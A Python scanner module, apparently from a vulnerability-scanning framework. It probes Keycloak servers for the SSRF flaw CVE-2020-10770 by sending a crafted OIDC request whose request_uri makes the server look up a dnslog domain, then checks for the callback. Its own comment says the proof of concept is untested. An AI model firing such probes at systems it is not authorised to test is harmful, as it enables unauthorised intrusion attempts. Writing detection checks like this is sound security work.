#!/usr/bin/env python3
# -*- coding:utf-8 -*-

''' 该POC没有经过实际环境验证(暂未找到漏洞环境, 还没测试POC准确性)

    Keycloak扫描类: 
        Keycloak SSRF
            CVE-2020-10770
                Payload: Awvs scanner
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Keycloak():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Keycloak'
        self.md = md5(self.app_name)

        self.cve_2020_10770_payloads = [
            {
                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=dnsdomain',
                'data': ''
            }
        ]

    def cve_2020_10770_scan(self, url):
        ''' 强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL '''
        sessid = '4a397cf8261c330c8e8c8f584b1b647a'
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2020-10770'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers
        # headers.update(vul_info['headers'])

        for payload in self.cve_2020_10770_payloads:                # * Payload
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
            data = payload['data']                                  # * Data
            target = url + path                                     # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers, 
                    data=data,
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None            

            sleep(2)                                                # * dns查询可能较慢, 等一会
            if ((res.status_code == 400) and (md in dns.result(md, sessid))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_10770_scan, url=url)
        ]

keycloak = Keycloak()